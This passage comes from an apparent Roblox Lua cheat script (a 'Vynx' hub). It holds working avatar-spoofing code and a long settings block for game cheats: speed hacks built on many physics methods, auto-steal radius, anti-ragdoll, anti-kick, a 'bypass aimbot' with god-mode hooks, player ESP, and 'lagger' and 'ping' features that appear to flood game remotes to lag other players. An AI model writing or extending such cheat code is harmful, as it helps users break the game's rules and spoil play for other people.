                        rightLeg.Color = DARK_GREY_COLOR
                    end
                end)
                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType = Enum.MeshType.FileMesh
                mesh.MeshId = KORBLOX_MESH_ID
                mesh.TextureId = KORBLOX_TEXTURE_ID
                mesh.Scale = Vector3.new(1, 1, 1)
                mesh.Name = "KorbloxMesh"
                mesh.Parent = rightLeg
            end
        elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
            local rightUpperLeg = char:FindFirstChild("RightUpperLeg")
            if rightUpperLeg then
                rightUpperLeg.Transparency = 1
                local rightLowerLeg = char:FindFirstChild("RightLowerLeg")
                local rightFoot = char:FindFirstChild("RightFoot")
                if rightLowerLeg then rightLowerLeg.Transparency = 1 end
                if rightFoot then rightFoot.Transparency = 1 end

                local oldKorblox = char:FindFirstChild("KorbloxLeg")
                if oldKorblox then oldKorblox:Destroy() end

                local korbloxLeg = Instance.new("Part")
                korbloxLeg.Name = "KorbloxLeg"
                korbloxLeg.Size = Vector3.new(1, 2, 1)
                korbloxLeg.Anchored = false
                korbloxLeg.CanCollide = false
                korbloxLeg.Color = DARK_GREY_COLOR
                korbloxLeg.Parent = char

                local mesh = Instance.new("SpecialMesh")
                mesh.MeshType = Enum.MeshType.FileMesh
                mesh.MeshId = KORBLOX_MESH_ID
                mesh.TextureId = KORBLOX_TEXTURE_ID
                mesh.Scale = Vector3.new(1, 1, 1)
                mesh.Name = "KorbloxMesh"
                mesh.Parent = korbloxLeg

                local weld = Instance.new("Weld")
                weld.Part0 = rightUpperLeg
                weld.Part1 = korbloxLeg
                weld.C0 = CFrame.new(0, -0.8, 0)
                weld.Name = "KorbloxWeld"
                weld.Parent = korbloxLeg
            end
        end
    else
        if humanoid.RigType == Enum.HumanoidRigType.R6 then
            local rightLeg = char:FindFirstChild("Right Leg")
            if rightLeg then
                for _, child in ipairs(rightLeg:GetChildren()) do
                    if child:IsA("SpecialMesh") and child.Name == "KorbloxMesh" then
                        child:Destroy()
                    end
                end
                rightLeg.Color = Color3.fromRGB(255, 255, 255)
            end
        elseif humanoid.RigType == Enum.HumanoidRigType.R15 then
            local rightUpperLeg = char:FindFirstChild("RightUpperLeg")
            if rightUpperLeg then
                rightUpperLeg.Transparency = 0
                local rightLowerLeg = char:FindFirstChild("RightLowerLeg")
                local rightFoot = char:FindFirstChild("RightFoot")
                if rightLowerLeg then rightLowerLeg.Transparency = 0 end
                if rightFoot then rightFoot.Transparency = 0 end
                local korbloxLeg = char:FindFirstChild("KorbloxLeg")
                if korbloxLeg then korbloxLeg:Destroy() end
            end
        end
    end
end

function M.applyCharterToChar(char)
    if not char then return end
    M.applyHeadlessToChar(char, M.headlessEnabled)
    M.applyKorbloxToChar(char, M.korbloxEnabled)
    if M.skinKeepOnRespawn then
        task.defer(function()
            M.applyAllCustomAccessories(char)
            if M.applyEnabledPresets then M.applyEnabledPresets(char) end
            M.applyCustomClothing(char)
        end)
    end
end




M.customAccessoryIds = M.customAccessoryIds or {} 
M.skinKeepOnRespawn = true


M.ACCESSORY_PRESETS = {
    { id = 9605378039,       name = "Acc 1" },
    { id = 87719366970131,   name = "Acc 2" },
    { id = 116598301380135,  name = "Acc 3" },
    { id = 82936472639935,   name = "Acc 4" },
    { id = 132323301214731,  name = "Acc 5" },
    { id = 108363680224601,  name = "Acc 6" },
    { id = 12796496795,      name = "Acc 7" },
}
M.presetAccessoryOn = M.presetAccessoryOn or {} 

function M.setPresetAccessory(id, on)
    id = tonumber(id)
    if not id then return end
    M.presetAccessoryOn = M.presetAccessoryOn or {}
    M.presetAccessoryOn[tostring(id)] = on and true or false
    if on then
        M.addCustomAccessoryId(id)
    else
        M.removeCustomAccessoryId(id)
    end
end

function M.applyEnabledPresets(char)
    char = char or player.Character
    if not char then return end
    M.presetAccessoryOn = M.presetAccessoryOn or {}
    for _, p in ipairs(M.ACCESSORY_PRESETS or {}) do
        if M.presetAccessoryOn[tostring(p.id)] then
            pcall(function() M.applyAccessoryId(p.id, char) end)
            task.wait(0.04)
        end
    end
end
M.customShirtId = nil   
M.customPantsId = nil   
M.bodySkinPreset = "None" 
M.bodySkinCustomRGB = {163, 162, 165}

M.BODY_SKIN_PRESETS = {
    ["None"] = nil,
    ["White"] = Color3.fromRGB(242, 243, 243),
    ["Black"] = Color3.fromRGB(27, 42, 53),
    ["Tan"] = Color3.fromRGB(204, 142, 105),
    ["Gray"] = Color3.fromRGB(163, 162, 165),
    ["Red"] = Color3.fromRGB(196, 40, 28),
    ["Blue"] = Color3.fromRGB(13, 105, 172),
    ["Custom"] = "custom",
}

local BODY_PART_NAMES = {
    "Head", "Torso", "Left Arm", "Right Arm", "Left Leg", "Right Leg",
    "UpperTorso", "LowerTorso", "LeftUpperArm", "LeftLowerArm", "LeftHand",
    "RightUpperArm", "RightLowerArm", "RightHand", "LeftUpperLeg", "LeftLowerLeg",
    "LeftFoot", "RightUpperLeg", "RightLowerLeg", "RightFoot",
}

function M.clearVynxAccessories(char)
    char = char or player.Character
    if not char then return end
    for _, child in ipairs(char:GetChildren()) do
        if (child:IsA("Accessory") or child:IsA("Hat")) and child:GetAttribute("VynxSkin") then
            pcall(function() child:Destroy() end)
        end
    end
end

function M.applyAccessoryId(id, char)
    id = tonumber(id)
    if not id or id <= 0 then return false, "Invalid ID" end
    char = char or player.Character
    if not char then return false, "No character" end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if not hum then return false, "No humanoid" end

    
    for _, child in ipairs(char:GetChildren()) do
        if (child:IsA("Accessory") or child:IsA("Hat")) and child:GetAttribute("VynxSkin") == id then
            return true, "Already applied"
        end
    end

    local ok, err = pcall(function()
        local InsertService = game:GetService("InsertService")
        local model = InsertService:LoadAsset(id)
        if not model then error("LoadAsset failed") end
        local acc = model:FindFirstChildOfClass("Accessory")
            or model:FindFirstChildOfClass("Hat")
            or model:FindFirstChildWhichIsA("Accessory", true)
            or model:FindFirstChildWhichIsA("Hat", true)
        if not acc then
            
            for _, c in ipairs(model:GetChildren()) do
                if c:IsA("Accessory") or c:IsA("Hat") then acc = c; break end
                if c:IsA("Model") then
                    acc = c:FindFirstChildOfClass("Accessory") or c:FindFirstChildOfClass("Hat")
                    if acc then break end
                end
            end
        end
        if not acc then
            model:Destroy()
            error("No Accessory found in asset " .. tostring(id))
        end
        acc.Name = "VynxAcc_" .. tostring(id)
        acc:SetAttribute("VynxSkin", id)
        
        local handle = acc:FindFirstChild("Handle")
        if handle and handle:IsA("BasePart") then
            handle.CanCollide = false
        end
        hum:AddAccessory(acc)
        
        pcall(function() model:Destroy() end)
    end)

    if not ok then
        
        local ok2 = pcall(function()
            local desc = Instance.new("HumanoidDescription")
            
            error(tostring(err))
        end)
        return false, tostring(err)
    end
    return true, "OK"
end

function M.applyAllCustomAccessories(char)
    char = char or player.Character
    if not char then return end
    if not M.customAccessoryIds or #M.customAccessoryIds == 0 then return end
    for _, id in ipairs(M.customAccessoryIds) do
        pcall(function() M.applyAccessoryId(id, char) end)
        task.wait(0.05)
    end
end

function M.addCustomAccessoryId(id)
    id = tonumber(id)
    if not id or id <= 0 then return false end
    M.customAccessoryIds = M.customAccessoryIds or {}
    for _, existing in ipairs(M.customAccessoryIds) do
        if existing == id then
            M.applyAccessoryId(id)
            return true
        end
    end
    table.insert(M.customAccessoryIds, id)
    M.applyAccessoryId(id)
    return true
end

function M.removeCustomAccessoryId(id)
    id = tonumber(id)
    if not id then return end
    local newList = {}
    for _, existing in ipairs(M.customAccessoryIds or {}) do
        if existing ~= id then table.insert(newList, existing) end
    end
    M.customAccessoryIds = newList
    local char = player.Character
    if char then
        for _, child in ipairs(char:GetChildren()) do
            if (child:IsA("Accessory") or child:IsA("Hat")) and child:GetAttribute("VynxSkin") == id then
                pcall(function() child:Destroy() end)
            end
        end
    end
end

function M.clearAllCustomAccessories()
    M.customAccessoryIds = {}
    M.clearVynxAccessories(player.Character)
end

function M.applyCustomClothing(char)
    char = char or player.Character
    if not char then return end
    if M.customShirtId then
        local shirt = char:FindFirstChildOfClass("Shirt")
        if not shirt then
            shirt = Instance.new("Shirt")
            shirt.Name = "VynxShirt"
            shirt:SetAttribute("VynxSkin", true)
            shirt.Parent = char
        end
        pcall(function()
            shirt.ShirtTemplate = "rbxassetid://" .. tostring(M.customShirtId)
        end)
    end
    if M.customPantsId then
        local pants = char:FindFirstChildOfClass("Pants")
        if not pants then
            pants = Instance.new("Pants")
            pants.Name = "VynxPants"
            pants:SetAttribute("VynxSkin", true)
            pants.Parent = char
        end
        pcall(function()
            pants.PantsTemplate = "rbxassetid://" .. tostring(M.customPantsId)
        end)
    end
end

function M.clearCustomClothing(char)
    char = char or player.Character
    if not char then return end
    for _, child in ipairs(char:GetChildren()) do
        if (child:IsA("Shirt") or child:IsA("Pants")) and child:GetAttribute("VynxSkin") then
            pcall(function() child:Destroy() end)
        end
    end
    M.customShirtId = nil
    M.customPantsId = nil
end

function M.applyBodySkin(char)
    
    return
end

function M.setBodySkinPreset(name)
    
    M.bodySkinPreset = "None"
end

player.CharacterAdded:Connect(function(char)
    task.wait(0.15)
    M.applyCharterToChar(char)
end)


do
    local _charterAcc = 0
    RunService.Heartbeat:Connect(function(dt)
        if not (M.headlessEnabled or M.korbloxEnabled) then return end
        _charterAcc = _charterAcc + dt
        if _charterAcc < 0.5 then return end
        _charterAcc = 0
        local char = player.Character
        if char then M.applyCharterToChar(char) end
    end)
end




M.NS = 60
M.CS = 30
M.LAGGER_SPEED = 15
M.LAGGER_CARRY_SPEED = 24.5
M.speedMethod = "Velocity"
M.speedMethodList = {
    "Velocity", "AssemblyLinearVelocity", "Velocity Lerp", "AssemblyLinearVelocity Lerp",
    "CFrame", "CFrame Lerp", "Hyper CFrame", "Anchored CFrame", "PivotTo", "Model PivotTo", "Tween CFrame",
    "WalkSpeed", "Humanoid Move", "Humanoid MoveTo",
    "BodyVelocity", "BodyPosition", "BodyForce", "BodyThrust",
    "LinearVelocity", "VectorForce", "AlignPosition",
    "ApplyImpulse", "RocketPropulsion",
}
M.hyperMult = 4
M._lastSpeedMethod = nil
M._speedHRP = nil
M._anchoredBySpeed = nil
M._bodyVel = nil
M._bodyPosition = nil
M._bodyForce = nil
M._bodyThrust = nil
M._linearVel = nil
M._vectorForce = nil
M._alignPos = nil
M._rocket = nil
M._rocketTarget = nil
M._attLinVel = nil
M._attVecForce = nil
M._attAlign = nil
M._speedTween = nil
M.carrySpeedActive = false
M.laggerModeEnabled = false
M.laggerCarryActive = false
M.speedBoosterEnabled = true
M.speedBoosterPath = "Normal" 
M.speedBoosterPanelOpen = true
M.speedBoosterPos = nil
M.speedBoosterGui = nil
M.speedBoosterMain = nil
M.speedUIMode = "Original" 

M.antiRagdollEnabled = false
M.antiRagdollMode = "Splatter"
M.ragdollTPBaseEnabled = false
M.ragdollTPBaseRange = 50
M.ragdollTPBaseCooldown = 1.5
M._ragdollTPLast = 0
M._ragdollTPConn = nil
M._ragdollTPCharConn = nil
M.infJumpEnabled = false
M.infJumpMode = "hold"
M.medusaCounterEnabled = false
M.batCounterEnabled = false
M.unwalkEnabled = false
M.medusaResetEnabled = false
M.medusaResetDelay = 0.45
M._medusaResetPending = false
M.medusaDebounce = false
M.medusaLastUsed = 0
M.dropActive = false
M.autoLeftEnabled = false
M.autoRightEnabled = false
M.autoPlayEnabled = false 
M.autoPlayLockedDir = nil 
M.autoBatEnabled = false
M.autoSwingEnabled = true
M.autoMoveSwingEnabled = false
M.autoMoveSwingInterval = 0.3
M._alSwingDebounce = false
M._arSwingDebounce = false
M.antiLagEnabled = false
M.antiSummerBaseEnabled = false
M.antiSummerBaseConn = nil
M._antiSummerCleaned = {}

M.removeAccessoriesEnabled = false
M.antiLagDescConn = nil
M.stretchRezEnabled = false
M.stretchRezConn = nil
M.unwalkSavedAnimate = nil
M._anyKeyListening = false
M.autoTPEnabled = false
M.autoTPHeight = 20
M.autoTPConn = nil
M.cursedResetRemote = nil
M.CURSED_RESET_GUID = "f888ee6e-c86d-46e1-93d7-0639d6635d42"
M.guiTransparencyEnabled = false
M.mobileButtonsEnabled = true
M.mobileButtonsLocked = false
M.mobileButtonsSize = 100
M.circleButtonsEnabled = false 
M.mobileButtonShape = "Normal" 
M.mobBtnRefs = {}
M.mobGuiRef = nil
M.fovValue = 80
M.fovOptions = {80,120,180}
M.fovIndex = 1
M.laggerModePillRef = nil
M.carryModePillRef = nil
M.autoSwitchSpeedEnabled = false
M._autoSwitchWasSteal = false
M.autoTurnOffSpeedEnabled = false
M.autoSwitchLaggerSpeedEnabled = false
M.autoCarryEnemyBaseEnabled = false
M.autoCarryEnemyBaseRange = 35
M._autoCarryEnemyBaseConn = nil
M.AUTO_SWITCH_THRESHOLD = 25
M._autoSwitchSpeedConn = nil
M.customFontSelected = "None"
M._fontOrig = {}
M._fontConn = nil
M._fontMy = nil
M.FONT_NAMES = {"None", "Coding Font", "Summer", "Beachy", "Scary", "Bangers"}
M.mobBtnTransparencyEnabled = false
M.perButtonDragEnabled = true
M.antiKickEnabled = false
M.antiDieEnabled = true 
M.antiDieConn = nil
M._antiDieCharConn = nil
M.brainrotDetected = false
M.safeModeEnabled = false
M.mirrorTPDownEnabled = false 
M.mirrorTPPreviousY = {}
M.mirrorTPLastTeleport = 0
M.MIRROR_TP_DROP_THRESHOLD = 3
M.MIRROR_TP_DOWN_Y = -7.00
M.activeBatBillboard = nil
M.activeMedusaBillboard = nil
M.ragdollGuiEnabled = true
M.persistentRagdollGui = nil
M.uiLocked = false
M.holdInfJumpConn = nil
M.DROP_ASCEND_DURATION = 0.2
M.DROP_ASCEND_SPEED = 150
M.autoResetOnDeath = false
M.bypassAimbotEnabled = false
M.AUTO_BAT_V2_SPEED = 60
M.AUTO_BAT_V2_DIST = 1.0
M.AUTO_BAT_V2_HEIGHT = 1.5
M.AUTO_BAT_V2_V_OFF = 0.0
M.AUTO_BAT_V2_HIT_DIST = 4.5
M.AUTO_BAT_V2_SWING_CD = 0.08
M._batV2HitCooldown = false
M.bodyLockEnabled = false 
M.bodyLockRadius = 20
M.bodyLockConn = nil
M.hardHitEnabled = false
M.hardHitRadius = 10
M._hardHitRing = nil
M._hardHitConn = nil
M.ultraModeEnabled = false
M.antiDesyncPanelOpen = false
M.antiDesyncShield = false
M.antiDesyncVelocity = false
M.antiDesyncUiLocked = false
M.antiDesyncMinimized = false
M.antiDesyncGui = nil
M.antiDesyncMain = nil
M.antiDesyncPill = nil
M.antiDesyncConn = nil
M.musicPanelOpen = false
M.musicGui = nil
M.musicMain = nil
M.musicPill = nil
M.musicSound = nil
M.musicLastTrackId = nil
M.musicVolume = 0.8
M.musicWasPlaying = false
M.musicPanelPos = nil 
M.menuPos = nil
M.pingPanelPos = nil
M.vynxLaggerPanelPos = nil


M.pingPanelOpen = false
M.pingGui = nil
M.pingMain = nil
M.pingSettings = nil
M.pingActive = false
M.pingPower = 100000
M.pingInterval = 0.125
M.pingKeybindKb = "F"
M.pingKeybindGp = "ButtonR2"
M.pingAutoBrainrot = true


M.vynxLaggerPanelOpen = false
M.vynxLaggerGui = nil
M.vynxLaggerMain = nil
M.vynxLaggerSettings = nil
M.vynxLaggerActive = false
M.vynxLaggerLevel = "Mid" 
M.vynxLaggerKeybindKb = "V"
M.vynxLaggerKeybindGp = "None"
M.vynxLaggerLoopRunning = false
M.vynxLaggerRemote = nil
M.vynxLaggerListening = nil
M.VYNX_LAGGER_LEVELS = {
    Low  = { mode = "bless", poder = 25,  wait = 0.20 },
    Mid  = { mode = "bless", poder = 32,  wait = 0.18 },
    High = { mode = "bless", poder = 70,  wait = 0.16 },
}
M.pingRemote = nil
M.pingBrainrotMode = false
M.pingLastBrainrot = false
M.pingManualOverride = false
M.pingListening = nil
M.pingLoopRunning = false
M.musicTracks = {
    { name = "Billy Jean", id = 116197983114890 },
    { name = "Misery", id = 72740886806799 },
    { name = "Pretty hoe", id = 72892187453679 },
    { name = "Juice world", id = 116675448257664 },
    { name = "NBA yb", id = 6610531667026 },
    { name = "King von", id = 92784642779370 },
    { name = "Heather", id = 114031354430003 },
    { name = "Kodak", id = 7705363631070423 },
    { name = "Sosa", id = 128193661245797 },
    { name = "Yb Nevada", id = 92826410241810 },
    { name = "Kempachi", id = 97754558403570 },
    { name = "Booyah", id = 74411243854757 },
    { name = "Minds", id = 32789008740748 },
    { name = "Earrings", id = 94574184618707 },
    { name = "Queen st", id = 121093914989022 },
    { name = "Hex", id = 93460325674434 },
    { name = "I love", id = 121800400764624 },
    { name = "To late", id = 91309633236834 },
    { name = "Headclock", id = 121327265405582 },
    { name = "Jane", id = 120534517493665 },
    { name = "Hot,cold", id = 101255099020837 },
    { name = "Legacy", id = 107145145396784 },
    { name = "Think abt u", id = 74567741664348 },
    { name = "To the o", id = 86370168350239 },
    { name = "Want u", id = 138067913536122 },
    { name = "Uzi vert", id = 85184181353881 },
    { name = "Anime thighs", id = 115111509672428 },
    { name = "Eve Where I go", id = 87341155169406 },
    { name = "Baby chief", id = 129270149145441 },
}
M.bypassAimbotConn = nil
M._bypassGodConn = nil
M._bypassGodHealthConn = nil
M._bypassGodDiedConn = nil
M._bypassGodCharConn = nil
M.bypassPrevAutoRotate = nil
M.bypassHitCD = false
M.bypassSwingCD = 0.35
M.bypassHitDist = 8
M._bypassTarget = nil

M.stealMode = "Normal"
M.stealBarSize = 520
M.Steal = {
    AutoStealEnabled = false,
    StealRadius = 62,
    StealDuration = 1.4,
    StopTime = 0.35,
}
M.V3 = {
    enabled = false,
    conn = nil,
    progress = 0,
    lastInRange = 0,
    currentUid = nil,
    holding = false,
    holdPrompt = nil,
    cooldownUntil = 0,
}
M.autoRadiusEnabled = false
function M.getAutoRadius()
    local radius = math.clamp((tonumber(M.NS) or 60) + 1, 1, 500)
    return math.floor(radius * 10 + 0.5) / 10
end
function M.getActiveStealRadius()
    if M.stealMode == "Semi" then
        return math.min(tonumber(M.Semi.radius) or 10, 10)
    end
    return M.autoRadiusEnabled and M.getAutoRadius() or M.Steal.StealRadius
end
M.Semi = {
    enabled = false,
    holdMin = 1.3,
    holdMax = 2.6,
    entryDelay = 0.3,
    cooldown = 0.05,
    primeRange = 80,
    radius = 8, 
    conn = nil,
    scanThread = nil,
    plotSync = {caches = {}, connections = {}},
    animals = {},
    promptCache = {},
    internalCache = {},
    state = {active = false, startTime = 0, phase = "idle", label = "", lastResult = "", lastResultTime = 0},
    plots = nil,
    syncReady = false,
}
M.isStealing = false
M.stealStartTime = 0
M.stealConn = nil
M.progressConn = nil
M.animalCache = {}
M.promptCache = {}
M.stealCache = {}
M.playerESPEnabled = false
M.espList = {}
M.pingPopupActive = false
M.pingPopupGui = nil
M.pingCycleTimer = nil
M.Conns = {autoSteal=nil, antiRag=nil, batCounter=nil, anchor={}}
M._persistentConns = {}
M.alConn = nil
M.arConn = nil
M.alPhase = 1
M.arPhase = 1
M.aimbotConn = nil
M.lastMoveDir = Vector3.new(0,0,0)
M.batCounterDebounce = false
M.speedLabel = nil


M.KB = {
    DropBrainrot={kb=nil,gp=nil},
    AutoLeft={kb=nil,gp=nil},
    AutoRight={kb=nil,gp=nil},
    AutoBat={kb=nil,gp=nil},
    TPFloor={kb=nil,gp=nil},
    GuiHide={kb=nil,gp=nil},
    SpeedToggle={kb=nil,gp=nil},
    LaggerToggle={kb=nil,gp=nil},
    LaggerCarry={kb=nil,gp=nil},
    BypassAimbot={kb=nil,gp=nil},
    BodyLock={kb=nil,gp=nil},
    InstaReset={kb=nil,gp=nil},
}
M.AP_L1 = Vector3.new(-476.47,-6.28,92.73)
M.AP_L2 = Vector3.new(-483.12,-4.95,94.81)
M.AP_R1 = Vector3.new(-476.16,-6.52,25.62)
M.AP_R2 = Vector3.new(-483.06,-5.03,25.48)
M.MEDUSA_COOLDOWN = 25
M.BAT_COUNTER_SLAP_LIST = {"Bat","Slap","Iron Slap","Gold Slap","Diamond Slap","Emerald Slap","Ruby Slap","Dark Matter Slap","Flame Slap","Nuclear Slap","Galaxy Slap","Glitched Slap"}
M.fovConn = nil
M.defLightBrightness = nil
M.defLightClock = nil
M.defLightAmbient = nil
M.mainFrame = nil
M.normalBox = nil
M.carryBox = nil
M.laggerBox = nil
M.radInput = nil
M.autoTPHeightBox = nil
M.durationBox = nil
M.modeValLbl = nil
M.setInstaGrab = nil
M.setInfJumpVisual = nil
M.setAntiRagVisual = nil
M.setMedusaVisual = nil
M.setUnwalkVisual = nil
M.setAntiLagVisual = nil
M.setAutoSwingVisual = nil
M.setTranspVisual = nil
M.setLockVisual = nil
M.setMobVisual = nil
M.setCircleBtnsVisual = nil
M.setMedusaResetVisual = nil
M.antiKickSetVisual = nil
M.autoLeftSetVisual = nil
M.autoRightSetVisual = nil
M.autoBatSetVisual = nil
M.setAutoTPVisual = nil
M.setStretchRezVisual = nil
M.setAutoResetOnDeath = nil
M.setBypassVisual = nil
M.setBodyLockVisual = nil
M.setHardHitVisual = nil
M.setUltraModeVisual = nil
M._autoSwitchWasSteal = false

M.MOB_POS_FILE = "moveeduels_btnpos.json"
M._btnPosCache = nil
M.MOVE_KEYS = {
    [Enum.KeyCode.W]=true,
    [Enum.KeyCode.A]=true,
    [Enum.KeyCode.S]=true,
    [Enum.KeyCode.D]=true,
    [Enum.KeyCode.Up]=true,
    [Enum.KeyCode.Left]=true,
    [Enum.KeyCode.Down]=true,
    [Enum.KeyCode.Right]=true
}

M.showPlayerSpeeds = false
M.playerSpeedGuis = {}
M.playerSpeedUpdateConn = nil
M.removeAccEnabled = false
M.removeAccConn = nil
M.removedAccessories = {}
M.uiScale = 0.8
if UIS.TouchEnabled and not UIS.KeyboardEnabled then
    M.uiScale = 0.7
end
M.uiScaleSliderRef = nil
M.uiScaleLabelRef = nil
M.uiScaleBoxRef = nil
M.lineESPEnabled = false
M.menuOpen = true
M.speedESPEnabled = false

M.statusGui = nil
M.statusFill = nil
M.statusPctLbl = nil
M.statusRadiusLbl = nil
M.statusDot = nil
M.statusMain = nil
M.statusFpsLbl = nil




function M.addShimmerToLabel(lbl,color1,color2)
    local gr=Instance.new("UIGradient",lbl)
    gr.Color=ColorSequence.new({ColorSequenceKeypoint.new(0,color1 or Color3.fromRGB(100,100,100)),ColorSequenceKeypoint.new(0.5,color2 or Color3.fromRGB(255,255,255)),ColorSequenceKeypoint.new(1,color1 or Color3.fromRGB(100,100,100))})
    gr.Transparency=NumberSequence.new({NumberSequenceKeypoint.new(0,0.3,0),NumberSequenceKeypoint.new(0.5,0,0),NumberSequenceKeypoint.new(1,0.3,0)})
    return gr
end

function M.applyFOV()
    if M.fovConn then M.fovConn:Disconnect() end
    M.fovConn=RunService.RenderStepped:Connect(function() local cam=workspace.CurrentCamera;if cam then cam.FieldOfView=M.fovValue end end)
end




M.ragdollTimerThread = nil
M.ragdollTimerRemaining = 0
M.isRagdollActive = false

function M.updateRagdollTimer(duration)
    if M.ragdollTimerThread then
        task.cancel(M.ragdollTimerThread)
        M.ragdollTimerThread = nil
    end
    if duration <= 0 then
        M.isRagdollActive = false
        if M.headIndicator and M.headIndicator.ragdollTimer then
            M.headIndicator.ragdollTimer.Text = ""
        end
        return
    end
    M.isRagdollActive = true
    local startTime = tick()
    M.ragdollTimerRemaining = duration
    M.ragdollTimerThread = task.spawn(function()
        while M.isRagdollActive and M.ragdollTimerRemaining > 0 do
            local elapsed = tick() - startTime
            local remaining = math.max(0, duration - elapsed)
            M.ragdollTimerRemaining = remaining
            if M.headIndicator and M.headIndicator.ragdollTimer then
                M.headIndicator.ragdollTimer.Text = string.format("%.1fs", remaining)
            end
            if remaining <= 0 then
                M.isRagdollActive = false
                if M.headIndicator and M.headIndicator.ragdollTimer then
                    M.headIndicator.ragdollTimer.Text = ""
                end
                break
            end
            task.wait(0.05)
        end
        M.ragdollTimerThread = nil
    end)
end

function M.onHumanoidStateChanged(old,new)
    local char=player.Character;if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid");if not hum then return end
    local isRag=(new==Enum.HumanoidStateType.Physics or new==Enum.HumanoidStateType.Ragdoll or new==Enum.HumanoidStateType.FallingDown)
    if isRag and not hum.PlatformStand then
        M.updateRagdollTimer(2.6)
    end
end

function M.onMedusaStateChanged()
    local char=player.Character;if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid")
    if hum and hum.PlatformStand then
        M.updateRagdollTimer(4.5)
    end
end

function M.setupRagdollTriggers()
    local char=player.Character;if not char then return end
    local hum=char:FindFirstChildOfClass("Humanoid")
    if hum then
        hum.StateChanged:Connect(M.onHumanoidStateChanged)
        hum:GetPropertyChangedSignal("PlatformStand"):Connect(M.onMedusaStateChanged)
    end
end




function M.waitForAnimate(char)
    for _ = 1, 40 do
        local a = char:FindFirstChild("Animate")
        if a and a:FindFirstChild("idle") and a:FindFirstChild("run") and a:FindFirstChild("walk") then
            return a
        end
        task.wait(0.1)
    end
    return nil
end

function M.setAnim(animObj, id)
    if animObj and id then
        animObj.AnimationId = "rbxassetid://" .. tostring(id)
    end
end

function M.stopAllTracks(hum)
    if not hum then return end
    for _, t in ipairs(hum:GetPlayingAnimationTracks()) do
        pcall(function() t:Stop(0) end)
    end
end

function M.ensureAnim(folder, name)
    if not folder then return nil end
    local a = folder:FindFirstChild(name)
    if not a then
        a = Instance.new("Animation")
        a.Name = name
        a.Parent = folder
    end
    return a
end

function M.ensureIdleSlots(idleFolder, n)
    if not idleFolder then return end
    n = n or 2
    for i=1,n do
        M.ensureAnim(idleFolder, "Animation" .. i)
    end
end

function M.pick(pack, ...)
    for i = 1, select("#", ...) do
        local k = select(i, ...)
        local v = pack[k]
        if v ~= nil then return v end
    end
    return nil
end

function M.saveOriginalAnimate(char)
    if not char then return end
    if M.savedAnimate then return end
    local animate = char:FindFirstChild("Animate")
    if animate then
        M.savedAnimate = animate:Clone()
    end
end

function M.restoreOriginalAnimate(char)
    if not char then return end
    local hum = char:FindFirstChildOfClass("Humanoid")
    if hum then
        M.stopAllTracks(hum)
    end
    local currentAnimate = char:FindFirstChild("Animate")
    if currentAnimate then
        currentAnimate:Destroy()
    end
    if M.savedAnimate then
        local newAnimate = M.savedAnimate:Clone()
        newAnimate.Parent = char
        newAnimate.Disabled = true
        task.wait(0.06)
        newAnimate.Disabled = false
    end
end

function M.resetAnimations(char)
    if not char then return end
    M.restoreOriginalAnimate(char)
end

local applyingAnim = false
function M.applyAnimPack(packName)
    if not M.animPackEnabled then
        local char = player.Character
        if char then
            M.resetAnimations(char)
        end
        return false
    end
    if applyingAnim then return false end
    applyingAnim = true

    local pack = M.PACKS[packName]
    if not pack then
        applyingAnim = false
        return false
    end

    local char = player.Character or player.CharacterAdded:Wait()
    M.saveOriginalAnimate(char)

    local animate = M.waitForAnimate(char)
    if not animate then
        applyingAnim = false
        return false
    end

    local hum = char:FindFirstChildOfClass("Humanoid")
    M.stopAllTracks(hum)

    local runObj   = M.ensureAnim(animate:FindFirstChild("run"),   "RunAnim")
    local walkObj  = M.ensureAnim(animate:FindFirstChild("walk"),  "WalkAnim")
    local jumpObj  = M.ensureAnim(animate:FindFirstChild("jump"),  "JumpAnim")
    local fallObj  = M.ensureAnim(animate:FindFirstChild("fall"),  "FallAnim")
    local climbObj = M.ensureAnim(animate:FindFirstChild("climb"), "ClimbAnim")
    local swimObj  = M.ensureAnim(animate:FindFirstChild("swim"),     "Swim")
    local swimIdleObj = M.ensureAnim(animate:FindFirstChild("swimidle"), "SwimIdle")
    local idleFolder = animate:FindFirstChild("idle")

    M.setAnim(walkObj,  M.pick(pack, "WalkAnim", "Walk"))
    M.setAnim(runObj,   M.pick(pack, "RunAnim", "Run"))
    M.setAnim(jumpObj,  M.pick(pack, "JumpAnim", "Jump"))
    M.setAnim(fallObj,  M.pick(pack, "FallAnim", "Fall"))
    M.setAnim(climbObj, M.pick(pack, "ClimbAnim", "Climb"))
    M.setAnim(swimObj,      M.pick(pack, "Swim"))
    M.setAnim(swimIdleObj,  M.pick(pack, "SwimIdle") or M.pick(pack, "Swim"))

    if idleFolder then
        local a1 = M.pick(pack, "Animation1")
        local a2 = M.pick(pack, "Animation2")
        if a1 or a2 then
            M.ensureIdleSlots(idleFolder, 2)
            local id1 = a1 or a2
            local id2 = a2 or a1 or id1
            M.setAnim(idleFolder:FindFirstChild("Animation1"), id1)
            M.setAnim(idleFolder:FindFirstChild("Animation2"), id2)
        elseif pack.Idle and #pack.Idle > 0 then
            M.ensureIdleSlots(idleFolder, math.max(2, #pack.Idle))
            M.setAnim(idleFolder:FindFirstChild("Animation1"), pack.Idle[1])
            M.setAnim(idleFolder:FindFirstChild("Animation2"), pack.Idle[2] or pack.Idle[1])
            for i = 3, #pack.Idle do
                local a = idleFolder:FindFirstChild("Animation" .. i)
                if a then M.setAnim(a, pack.Idle[i]) end
            end
        end
    end

    animate.Disabled = true
    task.wait(0.06)
    animate.Disabled = false

    if hum then
        pcall(function()
            hum:ChangeState(Enum.HumanoidStateType.Landed)
            task.wait(0.03)
            hum:ChangeState(Enum.HumanoidStateType.Running)
        end)
    end

    M.animPack = packName
    applyingAnim = false
    return true
end




function M.createPlayerSpeedGui(plr)
    if plr == player then return end
    if M.playerSpeedGuis[plr] then return end
    local char = plr.Character
    if not char then return end
    local head = char:FindFirstChild("Head")
    if not head then return end
    local old = head:FindFirstChild("MoveePlayerSpeedBB")
    if old then old:Destroy() end
    local bb = Instance.new("BillboardGui")
    bb.Name = "MoveePlayerSpeedBB"
    bb.Size = UDim2.new(0, 80, 0, 24)
    bb.StudsOffset = Vector3.new(0, 2.2, 0)
    bb.AlwaysOnTop = true
    bb.Adornee = head
    bb.Parent = head
    local label = Instance.new("TextLabel", bb)
    label.Size = UDim2.new(1,0,1,0)
    label.BackgroundTransparency = 1
    label.Text = "0"
